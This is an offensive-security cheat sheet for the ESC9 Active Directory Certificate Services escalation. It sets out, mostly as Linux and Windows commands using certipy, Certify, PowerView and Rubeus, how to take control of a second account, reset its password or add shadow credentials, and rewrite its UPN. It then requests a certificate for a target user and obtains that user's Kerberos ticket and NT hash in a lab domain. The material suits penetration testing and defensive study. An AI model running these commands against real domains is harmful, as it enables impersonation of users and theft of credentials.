---
description: ESC | Active Directory Certificate Services
---

# ESC9

If the **`msPKI-Enrollment-Flag`** attribute of a certificate template includes the `CT_FLAG_NO_SECURITY_EXTENSION` flag, it prevents the addition of the `szOID_NTDS_CA_SECURITY_EXT` security extension to certificates issued from that template.

An attacker can exploit the loophole in certificate mapping by misusing privileges and manipulating a user’s **User Principal Name (UPN).**

1. **UPN Manipulation**\
   User Principal Name can be changed to match the UPN of another account or target.
2. **Requesting a certificate**\
   Using those legit credentials or original UPN, request a certificate on behalf of that user.
3. **Certificate Mapping**\
   Associate issued certificate matching the altered UPN.
4. **Result**\
   Attacker has valid certificate mapped to target account.

```bash
# Find vulnerabilities
certipy-ad find -u 'zen@lab.local' -p 'Password123!' -dc-ip 10.129.228.236 -vulnerable -stdout

# Showing
[!] Vulnerabilities                                             
      ESC9                              : 'LAB.LOCAL\\Domain Users' can enroll and template has no security extension 
```

If we want to compromise user3 we need to have FullControl rights over any account. We can modify user2's UPN to match our target user3's UPN. Then request certificate as user2 and we will receive the certificate for user3.

#### Find FullControl rights account

```bash
dacledit.py -action read -dc-ip 10.129.205.199 lab.local/blwasp:Password123! -principal blwasp -target user2
```

#### Add extra password with Shadow Credentials

```bash
certipy shadow auto -u 'BlWasp@lab.local' -p 'Password123!' -account user2
```

#### Modify UPN user2 to target UPN of user3.

```bash
certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn user3@lab.local
```

#### Request certificate with user2

```bash
certipy req -u 'user2@lab.local' -hashes 2b576acbe6bcfda7294d6bd18041b8fe -ca lab-LAB-DC-CA -template ESC9
```

#### Revert back to user2

```bash
certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn user2@lab.local
```

#### Authenticate with certificate and get TGT and hash

```bash
certipy auth -pfx user3.pfx -domain lab.local
```

### <mark style="color:yellow;">ESC9 Abuse from Windows</mark>

Enumeration with Certify.exe

```powershell
# Certify
.\Certify.exe find /vulnerable

# Check if registry is set to 1
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc

# Or CertificateMappingMethods is 0x4
reg query HKLM\System\CurrentControlSet\Control\SecurityProviders\Schannel\

# With powerview check privileges
$blwasp=(Get-DomainUser -Identity blwasp)
Get-DomainObjectAcl -LDAPFilter "(&(objectClass=user)(objectCategory=person))" -ResolveGUIDs | ? {($_.ActiveDirectoryRights -contains "GenericAll" -or $_.ActiveDirectoryRights -contains "GenericWrite") -and $_.SecurityIdentifier -eq $blwasp.objectsid}
```

#### Attack from Windows

```powershell
# Password reset
Set-DomainUserPassword -Identity user2 -AccountPassword $((ConvertTo-SecureString 'Newpassword123!' -AsPlainText -Force)) -Verbose

# Change user2 UPN to match user 3
Set-DomainObject user2 -Set @{'userPrincipalName'='user3@lab.local'} -Verbose

# Request Certificate using ESC9 and alt SAN user3
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:ESC9 /altname:user3

# Conver to pfx
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in .\user3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out user3.pfx

# Get ticket TGT as user3
.\Rubeus.exe asktgt /user:user3 /certificate:user3.pfx /getcredentials /nowrap
```
